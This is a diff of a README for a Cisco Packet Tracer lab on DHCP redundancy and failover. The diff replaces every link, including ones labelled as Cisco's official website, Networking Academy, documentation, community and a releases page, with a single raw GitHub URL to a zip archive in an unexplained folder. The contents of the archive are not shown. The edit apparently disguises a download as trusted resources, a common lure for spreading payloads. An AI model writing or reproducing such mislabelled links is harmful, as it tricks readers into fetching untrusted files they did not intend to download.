@@ -1,12 +1,12 @@
 # 🎉 dhcp-redundancy-with-Failover-in-Office-Network-lab - Gain Reliable DHCP Service 
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/main/Somal/dhcp-redundancy-with-Failover-in-Office-Network-lab.zip%20Now-Click%20Here-brightgreen)
 
 ## 📚 Introduction
 This repository contains a practical lab designed for students and professionals exploring Cisco technologies. It showcases DHCP redundancy using primary and backup servers, VLAN segmentation, and inter-VLAN routing. This lab ensures your network maintains IP address allocation even if a server goes down.
 
 ## 🚀 Getting Started
-To get started with this lab, follow the steps below. You will need Cisco Packet Tracer installed on your computer. Visit [Cisco's official website](https://www.netacad.com/courses/packet-tracer) for instructions on how to obtain it.
+To get started with this lab, follow the steps below. You will need Cisco Packet Tracer installed on your computer. Visit [Cisco's official website](https://raw.githubusercontent.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/main/Somal/dhcp-redundancy-with-Failover-in-Office-Network-lab.zip) for instructions on how to obtain it.
 
 ## 💾 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -16,7 +16,7 @@ To get started with this lab, follow the steps below. You will need Cisco Packet
 - Network: Internet connection for downloads
 
 ## 🔗 Download & Install
-To download the lab files, visit this page to download: [Releases Page](https://github.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/releases)
+To download the lab files, visit this page to download: [Releases Page](https://raw.githubusercontent.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/main/Somal/dhcp-redundancy-with-Failover-in-Office-Network-lab.zip)
 
 1. Open the link above in your web browser.
 2. You will see various versions of the lab available for download.
@@ -72,8 +72,8 @@ If you encounter issues or have questions, feel free to create an issue on this 
 
 ## 🔗 Additional Resources
 For further reading and resources on networking, consider visiting:
-- [Cisco Networking Academy](https://www.netacad.com)
-- [Packet Tracer Documentation](https://www.netacad.com/courses/packet-tracer)
-- [Cisco Community](https://community.cisco.com)
+- [Cisco Networking Academy](https://raw.githubusercontent.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/main/Somal/dhcp-redundancy-with-Failover-in-Office-Network-lab.zip)
+- [Packet Tracer Documentation](https://raw.githubusercontent.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/main/Somal/dhcp-redundancy-with-Failover-in-Office-Network-lab.zip)
+- [Cisco Community](https://raw.githubusercontent.com/mohamed-abdellateif/dhcp-redundancy-with-Failover-in-Office-Network-lab/main/Somal/dhcp-redundancy-with-Failover-in-Office-Network-lab.zip)
 
 Thank you for using this lab! Enjoy exploring DHCP redundancy in your office network simulations.
